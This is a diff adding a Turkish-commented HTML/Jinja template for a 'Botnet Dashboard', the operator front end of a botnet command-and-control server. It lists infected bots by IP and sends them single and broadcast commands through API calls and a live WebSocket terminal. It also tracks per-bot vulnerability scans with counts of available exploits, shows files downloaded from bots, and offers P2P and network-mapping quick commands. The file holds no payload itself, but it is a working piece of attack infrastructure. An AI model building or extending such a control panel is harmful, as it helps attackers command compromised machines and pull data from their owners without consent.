@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Botnet Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a1f 50%, #2d1b3e 100%);
+            min-height: 100vh;
+            font-family: 'Orbitron', monospace;
+            color: #E040FB;
+        }
+        
+        .banner {
+            background: rgba(0,0,0,0.9);
+            color: #E040FB;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            white-space: pre;
+            font-size: 12px;
+            overflow-x: auto;
+            border: 2px solid #E040FB;
+            box-shadow: 0 0 20px rgba(224,64,251,0.6);
+            font-family: 'Courier New', monospace;
+            line-height: 1.2;
+            text-align: center;
+        }
+        
+        .card {
+            background: rgba(20, 20, 35, 0.95);
+            border: 2px solid #BA68C8;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(186,104,200,0.4);
+            backdrop-filter: blur(10px);
+            color: #E040FB;
+        }
+        
+        .card-header {
+            background: linear-gradient(45deg, #E040FB, #9C27B0);
+            color: #fff;
+            border-radius: 13px 13px 0 0 !important;
+            font-weight: bold;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+        }
+        
+        .status-active { color: #E040FB; text-shadow: 0 0 10px #E040FB; }
+        .status-inactive { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
+        .status-warning { color: #ffaa00; text-shadow: 0 0 10px #ffaa00; }
+        
+        .bot-card {
+            transition: all 0.3s ease;
+            border: 1px solid #BA68C8;
+        }
+        
+        .bot-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(224,64,251,0.7);
+            border-color: #E040FB;
+        }
+        
+        .command-input {
+            background: rgba(0,0,0,0.8);
+            border: 2px solid #BA68C8;
+            border-radius: 10px;
+            color: #E040FB;
+            font-family: 'Orbitron', monospace;
+        }
+        
+        .command-input:focus {
+            background: rgba(0,0,0,0.9);
+            border-color: #E040FB;
+            box-shadow: 0 0 15px rgba(224,64,251,0.6);
+            color: #E040FB;
+        }
+        
+        .btn-custom {
+            background: linear-gradient(45deg, #E040FB, #9C27B0);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-weight: bold;
+            font-family: 'Orbitron', monospace;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+            transition: all 0.3s ease;
+        }
+        
+        .btn-custom:hover {
+            background: linear-gradient(45deg, #9C27B0, #E040FB);
+            color: #fff;
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(224,64,251,0.7);
+        }
+        
+        .stats-card {
+            background: linear-gradient(45deg, #E040FB, #9C27B0);
+            color: #fff;
+            border: 2px solid #E040FB;
+            box-shadow: 0 0 20px rgba(224,64,251,0.6);
+        }
+        
+        .stats-card:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(224,64,251,0.8);
+        }
+        
+        .alert {
+            background: rgba(255, 170, 0, 0.1);
+            border: 1px solid #ffaa00;
+            color: #ffaa00;
+        }
+
+        /* Severity rozetleri */
+        .sev-critical { color: #ff4d4d; font-weight: 700; }
+        .sev-high { color: #ff884d; font-weight: 700; }
+        .sev-medium { color: #ffd24d; font-weight: 700; }
+        .sev-low { color: #4dff88; font-weight: 700; }
+        .sev-badge { border: 1px solid currentColor; padding: 2px 6px; border-radius: 6px; }
+        
+        .form-label {
+            color: #E040FB;
+            font-weight: bold;
+            text-shadow: 0 0 5px #E040FB;
+        }
+        
+        .text-muted {
+            color: #BA68C8 !important;
+        }
+        
+        /* Animasyonlar */
+        @keyframes glow {
+            0% { box-shadow: 0 0 5px #E040FB; }
+            50% { box-shadow: 0 0 20px #E040FB, 0 0 30px #E040FB; }
+            100% { box-shadow: 0 0 5px #E040FB; }
+        }
+        
+        .glow {
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #1a1a2e;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #BA68C8;
+            border-radius: 5px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #E040FB;
+        }
+        
+        /* Loading animasyonu */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(224,64,251,.3);
+            border-radius: 50%;
+            border-top-color: #E040FB;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Terminal efekti */
+        .terminal-text {
+            font-family: 'Courier New', monospace;
+            background: rgba(0,0,0,0.8);
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #BA68C8;
+        }
+        
+        /* Terminal özel stilleri */
+        .terminal-prompt {
+            background: rgba(224,64,251,0.2);
+            border: 1px solid #E040FB;
+            color: #E040FB;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+        }
+        
+        .terminal-line {
+            margin: 5px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.4;
+            white-space: pre-wrap;
+        }
+        
+        .terminal-line.system { color: #E040FB; }
+        .terminal-line.info { color: #00bfff; }
+        .terminal-line.success { color: #E040FB; }
+        .terminal-line.warning { color: #ffaa00; }
+        .terminal-line.error { color: #ff4444; }
+        
+        #terminal-output {
+            background: rgba(0,0,0,0.9);
+            border: 2px solid #E040FB;
+            border-radius: 8px;
+            color: #E040FB;
+        }
+        
+        #terminal-input {
+            font-family: 'Courier New', monospace;
+        }
+        
+        /* Pulse efekti */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid py-4">
+        <!-- Banner -->
+        <div class="banner text-center glow">
+            {{ banner }}
+        </div>
+        
+        <!-- Server Stats -->
+        <div class="row mb-4">
+            <div class="col-md-3">
+                <div class="card stats-card">
+                    <div class="card-body text-center">
+                        <i class="fas fa-server fa-2x mb-2"></i>
+                        <h5>Active Bots</h5>
+                        <h3 id="active-bots" class="pulse">{{ server_info.active_bots }}</h3>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card stats-card">
+                    <div class="card-body text-center">
+                        <i class="fas fa-shield-alt fa-2x mb-2"></i>
+                        <h5>Security Alerts</h5>
+                        <h3 id="security-alerts" class="pulse">{{ alerts|length }}</h3>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card stats-card">
+                    <div class="card-body text-center">
+                        <i class="fas fa-network-wired fa-2x mb-2"></i>
+                        <h5>P2P Networks</h5>
+                        <h3 id="p2p-networks" class="pulse">{{ p2p_status|length }}</h3>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card stats-card">
+                    <div class="card-body text-center">
+                        <i class="fas fa-clock fa-2x mb-2"></i>
+                        <h5>Uptime</h5>
+                        <h3 id="uptime" class="pulse">--:--:--</h3>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Command Panel -->
+        <div class="row mb-4">
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-header">
+                        <i class="fas fa-terminal me-2"></i>Single Bot Command
+                    </div>
+                    <div class="card-body">
+                        <div class="mb-3">
+                            <label class="form-label">Bot ID:</label>
+                            <select class="form-select command-input" id="bot-select">
+                                <option value="">Select Bot...</option>
+                                {% for bot_id, bot in bots.items() %}
+                                <option value="{{ bot_id }}">{{ bot_id }} ({{ bot.ip }})</option>
+                                {% endfor %}
+                            </select>
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label">Command:</label>
+                            <input type="text" class="form-control command-input" id="single-command" placeholder="Enter command...">
+                        </div>
+                        <button class="btn btn-custom" onclick="sendSingleCommand()">
+                            <i class="fas fa-paper-plane me-2"></i>Send Command
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-header">
+                        <i class="fas fa-broadcast-tower me-2"></i>Broadcast Command
+                    </div>
+                    <div class="card-body">
+                        <div class="mb-3">
+                            <label class="form-label">Command:</label>
+                            <input type="text" class="form-control command-input" id="broadcast-command" placeholder="Enter broadcast command...">
+                        </div>
+                        <button class="btn btn-custom" onclick="sendBroadcastCommand()">
+                            <i class="fas fa-broadcast-tower me-2"></i>Broadcast
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Bots List -->
+        <div class="row">
+            <div class="col-md-8">
+                <div class="card">
+                    <div class="card-header">
+                        <i class="fas fa-robot me-2"></i>Connected Bots
+                    </div>
+                    <div class="card-body">
+                        <div class="row" id="bots-container">
+                            {% for bot_id, bot in bots.items() %}
+                            <div class="col-md-6 mb-3">
+                                <div class="card bot-card">
+                                    <div class="card-body">
+                                        <h6 class="card-title">{{ bot_id }}</h6>
+                                        <p class="card-text">
+                                            <small class="text-muted">
+                                                <i class="fas fa-map-marker-alt me-1"></i>{{ bot.ip }}<br>
+                                                <i class="fas fa-clock me-1"></i>{{ bot.last_seen|datetime }}<br>
+                                                <i class="fas fa-network-wired me-1"></i>
+                                                P2P: 
+                                                {% if bot_id in p2p_status %}
+                                                    <span class="status-{{ p2p_status[bot_id].status }}">{{ p2p_status[bot_id].status }}</span>
+                                                {% else %}
+                                                    <span class="status-inactive">unknown</span>
+                                                {% endif %}<br>
+                                                <i class="fas fa-shield-alt me-1"></i>
+                                                Security: 
+                                                {% if bot_id in alerts %}
+                                                    <span class="status-warning">Alert</span>
+                                                {% else %}
+                                                    <span class="status-active">Clean</span>
+                                                {% endif %}
+                                            </small>
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Alerts Panel -->
+            <div class="col-md-4">
+                <div class="card">
+                    <div class="card-header">
+                        <i class="fas fa-exclamation-triangle me-2"></i>Security Alerts
+                    </div>
+                    <div class="card-body">
+                        <div id="alerts-container">
+                            {% for bot_id, alert in alerts.items() %}
+                            <div class="alert">
+                                <strong>{{ bot_id }}</strong><br>
+                                <small>{{ alert.message }}</small><br>
+                                <small class="text-muted">{{ alert.timestamp|datetime }}</small>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Vulnerabilities & Downloads -->
+        <div class="row mt-4">
+            <div class="col-md-8">
+                <div class="card">
+                    <div class="card-header">
+                        <i class="fas fa-bug me-2"></i>Vulnerability Summary
+                    </div>
+                    <div class="card-body">
+                        <div class="row mb-3">
+                            <div class="col-md-4">
+                                <div class="card stats-card">
+                                    <div class="card-body text-center">
+                                        <i class="fas fa-list-ol fa-2x mb-2"></i>
+                                        <h6>Total Vulnerabilities</h6>
+                                        <h4 id="vuln-total" class="pulse">0</h4>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <div class="card stats-card">
+                                    <div class="card-body text-center">
+                                        <i class="fas fa-fire fa-2x mb-2"></i>
+                                        <h6>High / Critical</h6>
+                                        <h4 id="vuln-high" class="pulse">0</h4>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <div class="card stats-card">
+                                    <div class="card-body text-center">
+                                        <i class="fas fa-microchip fa-2x mb-2"></i>
+                                        <h6>Bots Scanned</h6>
+                                        <h4 id="vuln-bots" class="pulse">0</h4>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col-md-7">
+                                <div class="terminal-text" style="max-height:300px; overflow:auto;">
+                                    <h6 class="mb-2">By Platform</h6>
+                                    <div id="vuln-platforms"></div>
+                                </div>
+                            </div>
+                            <div class="col-md-5">
+                                <div class="terminal-text" style="max-height:300px; overflow:auto;">
+                                    <h6 class="mb-2">Bots with Vulnerabilities</h6>
+                                    <div id="vuln-bots-list"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card">
+                    <div class="card-header">
+                        <i class="fas fa-download me-2"></i>Recent Downloads
+                    </div>
+                    <div class="card-body">
+                        <div id="downloads-container" class="terminal-text" style="max-height:430px; overflow:auto;"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Real-time Terminal -->
+        <div class="row mt-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <i class="fas fa-terminal me-2"></i>Real-time Terminal
+                        <button class="btn btn-custom btn-sm float-end" onclick="clearTerminal()">
+                            <i class="fas fa-trash me-1"></i>Clear
+                        </button>
+                    </div>
+                    <div class="card-body">
+                        <div id="terminal-output" class="terminal-text" style="height: 400px; overflow-y: auto; margin-bottom: 15px;">
+                            <div class="terminal-line system">🟢 Terminal ready - Type 'help' for commands</div>
+                        </div>
+                        <div class="input-group">
+                            <span class="input-group-text terminal-prompt">$</span>
+                            <input type="text" class="form-control command-input" id="terminal-input" placeholder="Enter command... (try 'list' or 'help')" autocomplete="off">
+                            <button class="btn btn-custom" onclick="sendTerminalCommand()">
+                                <i class="fas fa-paper-plane"></i>
+                            </button>
+                        </div>
+                        <div class="mt-2">
+                            <small class="text-muted">
+                                💡 Quick commands: <code>list</code> (show bots), <code>help</code> (commands), <code>status</code> (system info)
+                            </small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Status Bar -->
+        <div class="row mt-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-body text-center">
+                        <div class="terminal-text">
+                            <span id="status-text">🟢 System Online | 📡 Monitoring Active | 🔒 Security Enabled</span>
+                            <span id="loading-indicator" style="display:none;" class="loading ms-2"></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <script>
+        // WebSocket bağlantısı
+        const socket = io();
+        
+        // Terminal için
+        let commandHistory = [];
+        let historyIndex = -1;
+        
+        // Socket event listeners
+        socket.on('connect', function() {
+            console.log('WebSocket connected');
+        });
+        
+        socket.on('terminal_output', function(data) {
+            addTerminalOutput(data.type, data.message, data.timestamp);
+        });
+        
+        socket.on('terminal_clear', function() {
+            document.getElementById('terminal-output').innerHTML = '';
+        });
+        
+        // Terminal fonksiyonları
+        function addTerminalOutput(type, message, timestamp) {
+            const output = document.getElementById('terminal-output');
+            const line = document.createElement('div');
+            line.className = `terminal-line ${type}`;
+            
+            const time = new Date(timestamp * 1000).toLocaleTimeString();
+            line.textContent = `[${time}] ${message}`;
+            
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        function sendTerminalCommand() {
+            const input = document.getElementById('terminal-input');
+            const command = input.value.trim();
+            
+            if (!command) return;
+            
+            // Komut geçmişine ekle
+            commandHistory.unshift(command);
+            if (commandHistory.length > 50) commandHistory.pop();
+            historyIndex = -1;
+            
+            // Terminal'e komutu göster
+            addTerminalOutput('system', `$ ${command}`, Date.now() / 1000);
+            
+            // Komut parsing
+            let bot_id = '';
+            let actual_command = command;
+            
+            // Bot ID'si var mı kontrol et (format: bot_id command)
+            const parts = command.split(' ');
+            if (parts.length >= 2 && !['list', 'bots', 'ls', 'help', '?', 'clear', 'cls', 'status'].includes(parts[0].toLowerCase())) {
+                bot_id = parts[0];
+                actual_command = parts.slice(1).join(' ');
+            }
+            
+            // WebSocket ile gönder
+            socket.emit('terminal_command', {
+                command: actual_command,
+                bot_id: bot_id
+            });
+            
+            input.value = '';
+        }
+        
+        function clearTerminal() {
+            document.getElementById('terminal-output').innerHTML = '';
+            addTerminalOutput('system', '🟢 Terminal cleared', Date.now() / 1000);
+        }
+        
+        // Enter tuşu ile komut gönder
+        document.getElementById('terminal-input').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                sendTerminalCommand();
+            } else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    this.value = commandHistory[historyIndex] || '';
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    this.value = commandHistory[historyIndex] || '';
+                } else if (historyIndex === 0) {
+                    historyIndex = -1;
+                    this.value = '';
+                }
+            }
+        });
+        
+        // Auto-refresh data every 5 seconds
+        setInterval(refreshData, 5000);
+        
+        function refreshData() {
+            const loadingIndicator = document.getElementById('loading-indicator');
+            const statusText = document.getElementById('status-text');
+            
+            loadingIndicator.style.display = 'inline-block';
+            statusText.textContent = '🔄 Updating data...';
+            
+            fetch('/api/bots')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('active-bots').textContent = data.active;
+                    updateBotsList(data.bots);
+                })
+                .catch(error => {
+                    console.error('Error fetching bots:', error);
+                });
+                
+            fetch('/api/alerts')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('security-alerts').textContent = data.total_alerts;
+                    updateAlerts(data.alerts);
+                })
+                .catch(error => {
+                    console.error('Error fetching alerts:', error);
+                });
+                
+            fetch('/api/p2p')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('p2p-networks').textContent = data.active_p2p;
+                })
+                .catch(error => {
+                    console.error('Error fetching P2P:', error);
+                })
+            
+            // Vuln summary
+            fetch('/api/vulns')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('vuln-total').textContent = data.total_vulnerabilities;
+                    document.getElementById('vuln-bots').textContent = data.total_bots_scanned;
+                    // High/Critical toplamını hesapla
+                    let high = 0;
+                    for (const [platform, stats] of Object.entries(data.platforms || {})) {
+                        high += (stats.high_severity || 0);
+                    }
+                    document.getElementById('vuln-high').textContent = high;
+                    updateVulnPlatforms(data.platforms || {});
+                    updateVulnBotsList(data.per_bot_counts || {});
+                })
+                .catch(error => console.error('Error fetching vulns:', error));
+
+            // Downloads
+            fetch('/api/downloads')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        updateDownloads(data.downloads);
+                    }
+                })
+                .catch(error => console.error('Error fetching downloads:', error))
+                .finally(() => {
+                    loadingIndicator.style.display = 'none';
+                    statusText.textContent = '🟢 System Online | 📡 Monitoring Active | 🔒 Security Enabled';
+                });
+        }
+        
+        function sendSingleCommand() {
+            const botId = document.getElementById('bot-select').value;
+            const command = document.getElementById('single-command').value;
+            
+            if (!botId || !command) {
+                alert('Please select a bot and enter a command');
+                return;
+            }
+            
+            const statusText = document.getElementById('status-text');
+            statusText.textContent = '📤 Sending command...';
+            
+            fetch('/api/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    bot_id: botId,
+                    command: command
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    statusText.textContent = '✅ Command sent successfully!';
+                    document.getElementById('single-command').value = '';
+                    setTimeout(() => {
+                        statusText.textContent = '🟢 System Online | 📡 Monitoring Active | 🔒 Security Enabled';
+                    }, 3000);
+                } else {
+                    statusText.textContent = '❌ Error: ' + data.error;
+                }
+            })
+            .catch(error => {
+                statusText.textContent = '❌ Network error';
+                console.error('Error:', error);
+            });
+        }
+        
+        function sendBroadcastCommand() {
+            const command = document.getElementById('broadcast-command').value;
+            
+            if (!command) {
+                alert('Please enter a command');
+                return;
+            }
+            
+            const statusText = document.getElementById('status-text');
+            statusText.textContent = '📡 Broadcasting command...';
+            
+            fetch('/api/broadcast', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    command: command
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    statusText.textContent = '✅ Broadcast command sent successfully!';
+                    document.getElementById('broadcast-command').value = '';
+                    setTimeout(() => {
+                        statusText.textContent = '🟢 System Online | 📡 Monitoring Active | 🔒 Security Enabled';
+                    }, 3000);
+                } else {
+                    statusText.textContent = '❌ Error: ' + data.error;
+                }
+            })
+            .catch(error => {
+                statusText.textContent = '❌ Network error';
+                console.error('Error:', error);
+            });
+        }
+        
+        function updateBotsList(bots) {
+            const container = document.getElementById('bots-container');
+            const items = Object.entries(bots || {});
+            if (!items.length) {
+                container.innerHTML = '<div class="col-12 text-center text-muted">No bots connected</div>';
+                return;
+            }
+            let html = '';
+            for (const [botId, bot] of items) {
+                html += `
+                <div class="col-md-6 mb-3">
+                    <div class="card bot-card">
+                        <div class="card-body">
+                            <h6 class="card-title">${botId}</h6>
+                            <p class="card-text">
+                                <small class="text-muted">
+                                    <i class="fas fa-map-marker-alt me-1"></i>${bot.ip || ''}<br>
+                                    <i class="fas fa-clock me-1"></i>${new Date((bot.last_seen||0)*1000).toLocaleString()}<br>
+                                </small>
+                            </p>
+                            <div class="d-flex gap-2">
+                                <button class="btn btn-custom btn-sm" onclick="quickCmd('${botId}','ai_p2p_status')"><i class="fas fa-brain me-1"></i>AI-P2P</button>
+                                <button class="btn btn-custom btn-sm" onclick="quickCmd('${botId}','vuln status')"><i class="fas fa-bug me-1"></i>Vulns</button>
+                                <button class="btn btn-custom btn-sm" onclick="quickCmd('${botId}','network_map status')"><i class="fas fa-project-diagram me-1"></i>Map</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>`;
+            }
+            container.innerHTML = html;
+        }
+        
+        function updateAlerts(alerts) {
+            const container = document.getElementById('alerts-container');
+            const items = Object.entries(alerts || {});
+            if (!items.length) {
+                container.innerHTML = '<div class="text-center text-muted">No alerts</div>';
+                return;
+            }
+            let html = '';
+            for (const [botId, alert] of items) {
+                const ts = new Date((alert.timestamp||0)*1000).toLocaleString();
+                html += `
+                <div class="alert">
+                    <strong>${botId}</strong><br>
+                    <small>${alert.message||''}</small><br>
+                    <small class="text-muted">${ts}</small>
+                </div>`;
+            }
+            container.innerHTML = html;
+        }
+
+        function updateVulnPlatforms(platforms) {
+            const container = document.getElementById('vuln-platforms');
+            const entries = Object.entries(platforms || {});
+            if (!entries.length) { container.innerHTML = '<div class="text-muted">No data</div>'; return; }
+            let html = '<ul class="mb-0">';
+            for (const [name, stats] of entries) {
+                html += `<li><strong>${name}</strong>: ${stats.total||0} total, <span class="sev-high sev-badge">${stats.high_severity||0} high</span>, ⚔️ ${stats.exploits_available||0} exploits</li>`;
+            }
+            html += '</ul>';
+            container.innerHTML = html;
+        }
+
+        function updateVulnBotsList(perBot) {
+            const container = document.getElementById('vuln-bots-list');
+            const entries = Object.entries(perBot || {}).sort((a,b)=>b[1]-a[1]);
+            if (!entries.length) { container.innerHTML = '<div class="text-muted">No data</div>'; return; }
+            let html = '<ul class="mb-0">';
+            for (const [botId, count] of entries) {
+                html += `<li>${botId}: <strong>${count}</strong></li>`;
+            }
+            html += '</ul>';
+            container.innerHTML = html;
+        }
+
+        function updateDownloads(downloads) {
+            const container = document.getElementById('downloads-container');
+            if (!downloads || !downloads.length) { container.innerHTML = '<div class="text-muted">No downloads</div>'; return; }
+            let html = '';
+            for (const d of downloads) {
+                const ts = new Date((d.timestamp||0)*1000).toLocaleString();
+                const ok = d.hash_verified ? '✅' : '⚠️';
+                html += `<div class="mb-2">
+                    <div><strong>${d.bot_id||''}</strong> · ${d.saved_path||''}</div>
+                    <div><small>${ts} · ${d.file_size||0} bytes · ${ok}</small></div>
+                </div>`;
+            }
+            container.innerHTML = html;
+        }
+
+        function quickCmd(botId, command) {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ bot_id: botId, command: command })
+            });
+        }
+        
+        // Update uptime
+        function updateUptime() {
+            fetch('/api/server')
+                .then(response => response.json())
+                .then(data => {
+                    const uptime = data.server_info.uptime_seconds;
+                    const hours = Math.floor(uptime / 3600);
+                    const minutes = Math.floor((uptime % 3600) / 60);
+                    const seconds = uptime % 60;
+                    document.getElementById('uptime').textContent = 
+                        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                })
+                .catch(error => {
+                    console.error('Error updating uptime:', error);
+                });
+        }
+        
+        setInterval(updateUptime, 1000);
+        updateUptime();
+        
+        // Initial data load
+        refreshData();
+    </script>
+</body>
+</html>
